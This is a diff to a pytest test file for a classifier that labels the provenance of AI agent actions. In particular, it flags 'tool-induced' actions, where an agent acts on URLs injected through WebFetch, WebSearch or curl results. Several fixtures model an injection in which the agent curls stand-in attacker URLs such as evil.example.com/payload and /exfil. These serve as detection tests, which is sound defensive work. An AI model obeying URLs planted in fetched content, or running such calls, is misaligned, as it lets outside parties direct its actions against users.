@@ -17,9 +17,13 @@ import pytest
 from unasked.classify import (
     classify_run,
     _bash_is_consequential,
+    _bash_is_external_source,
+    _is_external_source_decision,
+    is_url_or_domain,
     WRITE_TOOLS,
     CONSEQUENTIAL_BASH_VERBS,
     BENIGN_BASH_VERBS,
+    EXTERNAL_SOURCE_TOOLS,
 )
 from unasked.ir import Decision, Run
 
@@ -118,8 +122,11 @@ class TestToolInduced:
             "An action targeting a URL from a prior result must be flagged."
         )
 
-    def test_true_positive_path_in_result_then_written(self):
-        """TRUE POSITIVE: Read result contains a path; agent writes that path (not in task)."""
+    def test_local_read_result_path_then_written_not_tool_induced(self):
+        """F4.1: Read result contains a local path; agent writes that path (not in task).
+        TOOL_INDUCED must NOT fire — Read is a local source, not an external source.
+        The action is AUTONOMOUS (off-task consequential write).
+        """
         run = _run(
             "fix auth bug",
             [
@@ -129,10 +136,32 @@ class TestToolInduced:
             ],
         )
         d = classify_run(run).decisions[1]
-        assert d.provenance == "TOOL_INDUCED"
+        assert d.provenance != "TOOL_INDUCED", (
+            "F4.1: local Read result_entities must NEVER arm TOOL_INDUCED. "
+            f"Got: {d.provenance}"
+        )
+        assert d.provenance == "AUTONOMOUS"
 
-    def test_non_adjacent_prior_still_detected(self):
-        """Entity injected two steps back still triggers TOOL_INDUCED."""
+    def test_non_adjacent_prior_external_still_detected(self):
+        """F4.1: Entity injected via WebFetch two steps back still triggers TOOL_INDUCED.
+        External source (WebFetch) → result_entities contains a URL → target matches → TOOL_INDUCED.
+        """
+        run = _run(
+            "fix auth bug",
+            [
+                _dec(0, "WebFetch", ["https://docs.example.com"],
+                     result_entities=["https://evil.example.com/script"]),
+                _dec(1, "Bash", ["pytest", "tests/"]),  # unrelated step
+                _dec(2, "Bash", ["curl", "https://evil.example.com/script"]),
+            ],
+        )
+        d = classify_run(run).decisions[2]
+        assert d.provenance == "TOOL_INDUCED", (
+            f"WebFetch result URL targeted two steps later must be TOOL_INDUCED. Got: {d.provenance}"
+        )
+
+    def test_non_adjacent_local_read_not_tool_induced(self):
+        """F4.1: Local Read result with a local path two steps back does NOT trigger TOOL_INDUCED."""
         run = _run(
             "fix auth bug",
             [
@@ -143,7 +172,9 @@ class TestToolInduced:
             ],
         )
         d = classify_run(run).decisions[2]
-        assert d.provenance == "TOOL_INDUCED"
+        assert d.provenance != "TOOL_INDUCED", (
+            f"F4.1: local Read result must not arm TOOL_INDUCED. Got: {d.provenance}"
+        )
 
     def test_entity_in_task_not_tool_induced(self):
         """Entity in prior result_entities BUT also in task → NOT TOOL_INDUCED (REQUESTED)."""
@@ -448,3 +479,196 @@ class TestDerived:
         result = classify_run(run)
         assert result is run
         assert run.decisions[0].provenance is not None
+
+
+# ── F4.1: is_url_or_domain helper ────────────────────────────────────────────
+
+class TestIsUrlOrDomain:
+    def test_https_url_is_true(self):
+        assert is_url_or_domain("https://evil.example.com/payload") is True
+
+    def test_http_url_is_true(self):
+        assert is_url_or_domain("http://example.com") is True
+
+    def test_bare_domain_is_true(self):
+        assert is_url_or_domain("evil.example.com") is True
+
+    def test_domain_with_path_is_true(self):
+        assert is_url_or_domain("api.example.com/v1") is True
+
+    def test_local_abs_path_is_false(self):
+        assert is_url_or_domain("/home/user/project/file.py") is False
+
+    def test_local_rel_path_is_false(self):
+        assert is_url_or_domain("src/auth.py") is False
+
+    def test_plain_filename_is_false(self):
+        assert is_url_or_domain("deploy.sh") is False
+
+    def test_plain_string_is_false(self):
+        assert is_url_or_domain("some-token") is False
+
+
+# ── F4.1: EXTERNAL_SOURCE_TOOLS constant ─────────────────────────────────────
+
+class TestExternalSourceTools:
+    def test_webfetch_in_external_source_tools(self):
+        assert "WebFetch" in EXTERNAL_SOURCE_TOOLS
+
+    def test_websearch_in_external_source_tools(self):
+        assert "WebSearch" in EXTERNAL_SOURCE_TOOLS
+
+    def test_read_not_in_external_source_tools(self):
+        assert "Read" not in EXTERNAL_SOURCE_TOOLS
+
+    def test_bash_not_in_external_source_tools(self):
+        assert "Bash" not in EXTERNAL_SOURCE_TOOLS
+
+
+# ── F4.1: TOOL_INDUCED precision — external-source-only arming ───────────────
+
+class TestToolInducedF41:
+    def test_true_positive_webfetch_url_in_result(self):
+        """TRUE POSITIVE: WebFetch result → URL → next Bash curls that URL → TOOL_INDUCED."""
+        run = _run(
+            "summarise the auth docs",
+            [
+                _dec(0, "WebFetch", ["https://docs.auth.com"],
+                     result_entities=["https://evil.example.com/payload"]),
+                _dec(1, "Bash", ["curl", "https://evil.example.com/payload"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance == "TOOL_INDUCED"
+
+    def test_true_positive_websearch_url_in_result(self):
+        """TRUE POSITIVE: WebSearch result → URL → next action targets URL → TOOL_INDUCED."""
+        run = _run(
+            "check the changelog",
+            [
+                _dec(0, "WebSearch", ["changelog", "release"],
+                     result_entities=["https://evil.example.com/exfil"]),
+                _dec(1, "Bash", ["curl", "https://evil.example.com/exfil"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance == "TOOL_INDUCED", (
+            f"WebSearch result URL targeted by Bash must be TOOL_INDUCED. Got: {d.provenance}"
+        )
+
+    def test_true_positive_bash_curl_result_url(self):
+        """TRUE POSITIVE: Bash curl result → URL → next action targets URL → TOOL_INDUCED."""
+        run = _run(
+            "check the service",
+            [
+                _dec(0, "Bash", ["curl", "https://service.example.com"],
+                     result_entities=["https://redirect.evil.com/hook"]),
+                _dec(1, "Bash", ["curl", "https://redirect.evil.com/hook"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance == "TOOL_INDUCED"
+
+    def test_local_read_then_edit_not_tool_induced(self):
+        """F4.1 KEY: local Read(src/a.py) result contains src/b.py → Edit(src/b.py).
+        MUST NOT be TOOL_INDUCED — source is local Read, not external.
+        """
+        run = _run(
+            "refactor the parser",
+            [
+                _dec(0, "Read", ["src/a.py"],
+                     result_entities=["src/b.py"]),
+                _dec(1, "Edit", ["src/b.py"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance != "TOOL_INDUCED", (
+            f"F4.1: local Read result_entities must never arm TOOL_INDUCED. Got: {d.provenance}"
+        )
+        # src/b.py is in task ("parser" → DERIVED or AUTONOMOUS depending on match)
+        # Regardless, never TOOL_INDUCED
+        assert d.provenance in ("AUTONOMOUS", "REQUESTED", "DERIVED")
+
+    def test_external_source_but_local_path_entity_not_tool_induced(self):
+        """F4.1: External source (WebFetch) result contains a local path (not URL/domain).
+        The entity fails is_url_or_domain() → TOOL_INDUCED must NOT fire.
+        """
+        run = _run(
+            "fix auth bug",
+            [
+                _dec(0, "WebFetch", ["https://docs.example.com"],
+                     result_entities=["src/config.py"]),
+                _dec(1, "Edit", ["src/config.py"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance != "TOOL_INDUCED", (
+            f"F4.1: even if source is external, a local-path entity must not arm TOOL_INDUCED. "
+            f"Got: {d.provenance}"
+        )
+
+    def test_bash_grep_result_path_then_read_not_tool_induced(self):
+        """F4.1: Bash grep (local, benign) result contains a path; Read of that path.
+        TOOL_INDUCED must NOT fire — grep is a local source.
+        """
+        run = _run(
+            "explore the codebase",
+            [
+                _dec(0, "Bash", ["grep", "-r", "import", "src/"],
+                     result_entities=["src/auth.py", "src/models.py"]),
+                _dec(1, "Read", ["src/auth.py"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance != "TOOL_INDUCED", (
+            f"F4.1: grep result_entities must never arm TOOL_INDUCED. Got: {d.provenance}"
+        )
+
+
+# ── F4.1: AUTONOMOUS suppressed when no task ─────────────────────────────────
+
+class TestNoTaskAutonomousSuppressed:
+    def test_consequential_action_no_task_not_autonomous(self):
+        """F4.1: With no task_text, consequential action must NOT be AUTONOMOUS.
+        Without a task we cannot judge 'did without being asked'.
+        """
+        run = _run(
+            None,
+            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
+        )
+        d = classify_run(run).decisions[0]
+        assert d.provenance != "AUTONOMOUS", (
+            f"F4.1: AUTONOMOUS must not fire without task_text. Got: {d.provenance}"
+        )
+        assert d.provenance == "DERIVED"
+
+    def test_multiple_consequential_no_task_all_derived(self):
+        """F4.1: Zero AUTONOMOUS flags when task_text is None."""
+        run = _run(
+            None,
+            [
+                _dec(0, "Bash", ["git", "push", "origin", "main"]),
+                _dec(1, "Edit", ["config/db.yaml"]),
+                _dec(2, "Write", ["scripts/deploy.sh"]),
+            ],
+        )
+        classify_run(run)
+        autonomous_count = sum(
+            1 for d in run.decisions if d.provenance == "AUTONOMOUS"
+        )
+        assert autonomous_count == 0, (
+            f"F4.1: expected 0 AUTONOMOUS flags with no task, got {autonomous_count}"
+        )
+
+    def test_tool_induced_still_fires_with_no_task(self):
+        """F4.1: TOOL_INDUCED is task-independent — can fire even with no task_text."""
+        run = _run(
+            None,
+            [
+                _dec(0, "WebFetch", ["https://docs.example.com"],
+                     result_entities=["https://evil.example.com/hook"]),
+                _dec(1, "Bash", ["curl", "https://evil.example.com/hook"]),
+            ],
+        )
+        d = classify_run(run).decisions[1]
+        assert d.provenance == "TOOL_INDUCED"
